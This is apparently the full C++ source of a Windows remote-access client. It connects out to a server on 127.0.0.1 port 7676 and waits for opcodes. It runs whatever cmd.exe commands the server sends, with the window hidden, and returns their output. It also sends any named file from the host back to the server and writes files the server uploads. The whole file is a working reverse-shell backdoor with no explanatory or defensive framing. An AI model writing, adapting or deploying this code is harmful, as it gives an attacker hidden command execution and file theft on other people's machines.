#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#define RUNCMD 1
#define DOWNLOAD 2
#define UPLOAD 3
#define CLOSE 4
#pragma comment(lib, "Ws2_32.lib")

SOCKET connectServer(const char* serverAddr, const char* serverPort);
void messageHandler(SOCKET connectSocket);

int main()
{
    SOCKET connectSocket = connectServer("127.0.0.1", "7676");
    if (connectSocket != INVALID_SOCKET) {
        messageHandler(connectSocket);
    }
    else printf("Failed to connect");
    return 0;
}

SOCKET connectServer(const char* serverAddr, const char* serverPort) {
    WSADATA wsaData;
    ADDRINFO hints;
    memset(&hints, 0, sizeof(hints));
    ADDRINFO* result = NULL;
    SOCKET connectSocket = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return INVALID_SOCKET;
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(serverAddr, serverPort, &hints, &result) != 0) {
        printf("getaddrinfo failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }

    connectSocket = WSASocketW(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, 0, 0);
    if (connectSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return INVALID_SOCKET;
    }

    if (connect(connectSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        printf("Connect failed with error: %d\n", WSAGetLastError());
        closesocket(connectSocket);
        return INVALID_SOCKET;
    }
    return connectSocket;
}

void messageHandler(SOCKET connectSocket) {
    /*
    * Recv opCode and expectedSize (should be first 8 bytes)
    * Handle message depend on opCode
    * opCode: 1 RUNCMD, 2 DOWNLOAD, 3 UPLOAD, 4 CLOSE
    * Allocate and recv the message
    * Process message and send output to server (4b size + output)
    */
    int opCode = 0;
    int expectedSize = 0;
    char sizeBuffer[8];
    while (true) {
        //recv 8b: 4b opCode + 4b expectedSize
        int recved = 0;
        while (recved < 8)
            recved += recv(connectSocket, sizeBuffer + recved, 8 - recved, 0);
        if (recved == 8) {
            memcpy(&opCode, sizeBuffer, sizeof(int));
            memcpy(&expectedSize, sizeBuffer + 4, sizeof(int));
        }
        switch (opCode) {
        case RUNCMD: {
            // RECV from Server
            wchar_t* cmdBuffer = (wchar_t*)malloc(expectedSize + sizeof(wchar_t));
            memset(cmdBuffer, 0, expectedSize + sizeof(wchar_t));
            int received = 0;
            while (received < expectedSize) {
                received += recv(connectSocket, (char*)(cmdBuffer)+received, expectedSize - received, 0);
            }

            // RUNCMD and save output
            // Prepare full cmd to execute
            size_t fullCmdLen = wcslen(L"cmd.exe /c ") + (expectedSize / sizeof(wchar_t)) + 1;
            wchar_t* fullCmd = (wchar_t*)malloc(fullCmdLen * sizeof(wchar_t));
            swprintf(fullCmd, fullCmdLen, L"cmd.exe /c %ls", cmdBuffer);
            // Create a pipe so CreateProcess can read and write output to
            HANDLE hRead, hWrite;
            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
            if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
                free(cmdBuffer);
                free(fullCmd);
                break;
            }
            SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
            // Run the command, reading and saving the output
            STARTUPINFOW si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.dwFlags = STARTF_USESTDHANDLES;
            if (CreateProcessW(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(hWrite);
                hWrite = INVALID_HANDLE_VALUE;

                // Wait up to 5 seconds for the process to finish
                DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000);

                char tempBuf[1024];
                DWORD bytesRead;
                char* finalResult = NULL;
                int totalResultSize = 0;

                if (waitResult == WAIT_OBJECT_0) {
                    // Process finished normally, read all output from pipe
                    while (ReadFile(hRead, tempBuf, sizeof(tempBuf), &bytesRead, NULL) && bytesRead > 0) {
                        char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
                        if (newResult) {
                            finalResult = newResult;
                            memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
                            totalResultSize += bytesRead;
                        }
                    }
                }
                else {
                    // Process still running (timeout) then read whatever is available using PeekNamedPipe
                    DWORD available = 0;
                    if (PeekNamedPipe(hRead, NULL, 0, NULL, &available, NULL) && available > 0) {
                        while (available > 0) {
                            DWORD toRead = (available < sizeof(tempBuf)) ? available : sizeof(tempBuf);
                            if (ReadFile(hRead, tempBuf, toRead, &bytesRead, NULL) && bytesRead > 0) {
                                char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
                                if (newResult) {
                                    finalResult = newResult;
                                    memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
                                    totalResultSize += bytesRead;
                                }
                                available -= bytesRead;
                            }
                            else break;
                        }
                    }
                    // Send message telling user the process is still running
                    const char* timeoutMsg = "\nProcess still running in background (PID: ";
                    char pidStr[16];
                    sprintf_s(pidStr, "%lu", pi.dwProcessId);
                    const char* suffix = ")";

                    int msgLen = (int)(strlen(timeoutMsg) + strlen(pidStr) + strlen(suffix));
                    char* newResult = (char*)realloc(finalResult, totalResultSize + msgLen);
                    if (newResult) {
                        finalResult = newResult;
                        memcpy(finalResult + totalResultSize, timeoutMsg, strlen(timeoutMsg));
                        totalResultSize += (int)strlen(timeoutMsg);
                        memcpy(finalResult + totalResultSize, pidStr, strlen(pidStr));
                        totalResultSize += (int)strlen(pidStr);
                        memcpy(finalResult + totalResultSize, suffix, strlen(suffix));
                        totalResultSize += (int)strlen(suffix);
                    }
                }

                // If no output at all send "no output"
                if (totalResultSize == 0) {
                    const char* noOutput = "\n#no output#";
                    totalResultSize = (int)strlen(noOutput);
                    finalResult = (char*)malloc(totalResultSize);
                    memcpy(finalResult, noOutput, totalResultSize);
                }

                // SEND Client -> Server: [4b opCode] [4b Size] [output]
                send(connectSocket, (char*)&opCode, sizeof(int), 0);
                send(connectSocket, (char*)&totalResultSize, sizeof(int), 0);
                send(connectSocket, finalResult, totalResultSize, 0);

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                free(finalResult);
            }
            else {
                // CreateProcess failed, send error back
                CloseHandle(hWrite);
                hWrite = INVALID_HANDLE_VALUE;
                char errMsg[128];
                sprintf_s(errMsg, "CreateProcess failed with error: %lu", GetLastError());
                int errLen = (int)strlen(errMsg);
                send(connectSocket, (char*)&opCode, sizeof(int), 0);
                send(connectSocket, (char*)&errLen, sizeof(int), 0);
                send(connectSocket, errMsg, errLen, 0);
            }

            if (hWrite != INVALID_HANDLE_VALUE) CloseHandle(hWrite);
            CloseHandle(hRead);
            free(cmdBuffer);
            free(fullCmd);
            break;
        }
        case DOWNLOAD: {
            char* fileName = (char*)malloc(expectedSize);
            int recieved = 0;
            unsigned int fileSize = 0;
            LARGE_INTEGER largeInt;
            //recv from Server
            while (recieved < expectedSize) {
                recieved += recv(connectSocket, fileName + recieved, expectedSize - recieved, 0);
            }
            // Get file size and read file bytes into a buffer
            HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                GetFileSizeEx(hFile, &largeInt);
                fileSize = (unsigned int)largeInt.QuadPart;
                char* fileBuffer = (char*)malloc(fileSize);
                ReadFile(hFile, fileBuffer, fileSize, NULL, NULL);
                //send Client -> Server: [4b opCode] [4b Size] [fileData]
                send(connectSocket, (char*)&opCode, sizeof(int), 0);
                send(connectSocket, (char*)&fileSize, sizeof(int), 0);
                send(connectSocket, fileBuffer, fileSize, 0);
                free(fileBuffer);
            }//if create file failed, the file will contain error info
            else {
                char msg[50];
                sprintf_s(msg, "Failed to open file on client\nError: %d", GetLastError());
                int msgLen = strlen(msg) + 1;
                send(connectSocket, (char*)&opCode, sizeof(int), 0);
                send(connectSocket, (char*)&msgLen, sizeof(int), 0);
                send(connectSocket, msg, msgLen, 0);
            }

            CloseHandle(hFile);
            free(fileName);

            break;
        }
        case UPLOAD: {
            int uploadPathSize = expectedSize;
            char* uploadPath = (char*)malloc(uploadPathSize);
            char* fileBuffer;
            unsigned int fileSize = 0;
            HANDLE hFile = INVALID_HANDLE_VALUE;
            int result = 0;
            int resultSize = sizeof(int);
            int n = 0;
            /* Recv the uploadPathSize and uploadPath
            * Create file
            * Recv the fileSize and fileBuffer
            * Write into file
            * If success send back 1, else 0
            */
            //Recv the uploadPath
            n = 0;
            while (n < uploadPathSize)
                n += recv(connectSocket, uploadPath + n, uploadPathSize - n, 0);
            //recv fileSize
            n = 0;
            while (n < 4)
                n += recv(connectSocket, (char*)&fileSize + n, 4 - n, 0);
            //recv file bytes
            fileBuffer = (char*)malloc(fileSize);
            n = 0;
            while (n < fileSize)
                n += recv(connectSocket, fileBuffer + n, fileSize - n, 0);
            //CreateFile and WriteFile
            hFile = CreateFileA(uploadPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                if (WriteFile(hFile, fileBuffer, fileSize, NULL, NULL)) {
                    result = 1;
                    send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                    send(connectSocket, (char*)&result, sizeof(int), 0);
                }
                else {
                    result = GetLastError();
                    send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                    send(connectSocket, (char*)&result, sizeof(int), 0);
                }
            }
            else {
                result = GetLastError();
                send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                send(connectSocket, (char*)&result, sizeof(int), 0);
            }
            CloseHandle(hFile);
            free(uploadPath);
            free(fileBuffer);
            break;
        }
        case CLOSE:
            closesocket(connectSocket);
            return;
        default:
            // printf("opCode not sp");
            break;
        }
    }
}
